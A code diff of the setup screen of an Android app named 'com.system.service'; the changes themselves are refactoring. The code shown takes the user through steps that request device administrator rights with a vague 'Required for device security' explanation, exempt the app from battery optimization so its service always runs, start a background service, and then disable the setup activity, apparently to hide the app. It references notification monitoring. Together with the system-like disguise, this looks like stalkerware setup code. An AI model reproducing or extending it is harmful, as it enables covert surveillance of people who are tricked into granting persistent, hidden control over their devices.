@@ -1,27 +1,40 @@
 package com.system.service.setup
 
 import android.app.admin.DevicePolicyManager
-import android.content.*
+import android.content.ComponentName
+import android.content.Intent
 import android.net.Uri
-import android.os.*
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.os.PowerManager
 import android.provider.Settings
 import android.widget.Button
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import com.system.service.R
-import com.system.service.core.BootReceiver
 import com.system.service.core.CoreService
 import com.system.service.core.DeviceAdminReceiver
 import com.system.service.monitors.NotificationMonitor
-import com.system.service.monitors.AccessibilityMonitor
 
 class SetupActivity : AppCompatActivity() {
 
     private var currentStep = 0
+    
+    private lateinit var tvStep: TextView
+    private lateinit var tvTitle: TextView
+    private lateinit var tvDesc: TextView
+    private lateinit var btnAction: Button
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_setup)
+        
+        tvStep = findViewById(R.id.tvStep)
+        tvTitle = findViewById(R.id.tvTitle)
+        tvDesc = findViewById(R.id.tvDesc)
+        btnAction = findViewById(R.id.btnAction)
+        
         showStep(0)
     }
 
@@ -49,13 +62,15 @@ class SetupActivity : AppCompatActivity() {
             }
             2 -> updateUI("3/6", "Device Management",
                 "Required for security", "Activate") {
-                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).also {
-                    it.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
-                        ComponentName(this, DeviceAdminReceiver::class.java))
-                    it.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                        "Required for device security")
-                    startActivity(it)
-                }
+                val intent = Intent(
+                    DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                intent.putExtra(
+                    DevicePolicyManager.EXTRA_DEVICE_ADMIN,
+                    ComponentName(this, DeviceAdminReceiver::class.java))
+                intent.putExtra(
+                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                    "Required for device security")
+                startActivity(intent)
             }
             3 -> updateUI("4/6", "Battery Optimization",
                 "Keep service running always", "Disable") {
@@ -88,8 +103,8 @@ class SetupActivity : AppCompatActivity() {
         startForegroundService(Intent(this, CoreService::class.java))
         packageManager.setComponentEnabledSetting(
             ComponentName(this, SetupActivity::class.java),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
+            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            android.content.pm.PackageManager.DONT_KILL_APP
         )
         finishAffinity()
     }
@@ -122,22 +137,23 @@ class SetupActivity : AppCompatActivity() {
     }
 
     private fun isDeviceAdminEnabled(): Boolean {
-        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val dpm = getSystemService(DEVICE_POLICY_SERVICE) 
+            as DevicePolicyManager
         return dpm.isAdminActive(
             ComponentName(this, DeviceAdminReceiver::class.java))
     }
 
     private fun updateUI(
-        step: String, title: String,
-        desc: String, btnText: String,
+        step: String,
+        title: String,
+        desc: String,
+        btnText: String,
         action: () -> Unit
     ) {
-        findViewById<TextView>(R.id.tvStep).text = "Step $step"
-        findViewById<TextView>(R.id.tvTitle).text = title
-        findViewById<TextView>(R.id.tvDesc).text = desc
-        findViewById<Button>(R.id.btnAction).apply {
-            text = btnText
-            setOnClickListener { action() }
-        }
+        tvStep.text = "Step $step"
+        tvTitle.text = title
+        tvDesc.text = desc
+        btnAction.text = btnText
+        btnAction.setOnClickListener { action() }
     }
 }
